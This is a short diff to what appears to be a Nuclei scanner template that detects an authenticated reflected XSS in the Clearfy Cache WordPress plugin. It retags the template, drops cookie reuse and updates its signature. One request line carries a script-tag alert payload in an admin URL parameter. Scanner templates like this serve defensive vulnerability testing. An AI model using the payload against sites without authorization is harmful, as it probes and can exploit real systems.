@@ -14,7 +14,7 @@ info:
     cwe-id: CWE-80
   metadata:
     max-request: 2
-  tags: xss,wp,wordpress,authenticated,clearfy-cache,wpscan,wp-plugin
+  tags: xss,wp,wordpress,authenticated,clearfy-cache,wpscan,wp-plugin,vuln
 
 http:
   - raw:
@@ -29,8 +29,6 @@ http:
       - |
         GET /wp-admin/admin.php?page=gonzales-wbcr_clearfy&action=index&wbcr_assets_manager=1&a"><script>alert(1)</script> HTTP/1.1
         Host: {{Hostname}}
-
-    cookie-reuse: true
 
     matchers-condition: and
     matchers:
@@ -49,5 +47,4 @@ http:
       - type: status
         status:
           - 200
-
-# digest: 4b0a00483046022100e06f196ca9070be014c3bf807344981cba70a02a23486b7a98cc658b537ca898022100c1ccc8cfdb6bd00f679c20465e133af481ac78d368a494cf3e513689028eead9:922c64590222798bb761d5b6d8e72950
+# digest: 4b0a00483046022100f2de9886028a2856da3814fedf1c739a6b55cd0165cb85817757ab5f025985f9022100b4069987ba27469b9ffcdcfe02ba3f2bd636ff51e4bc088707d8efd9c3c1fe1d:922c64590222798bb761d5b6d8e72950
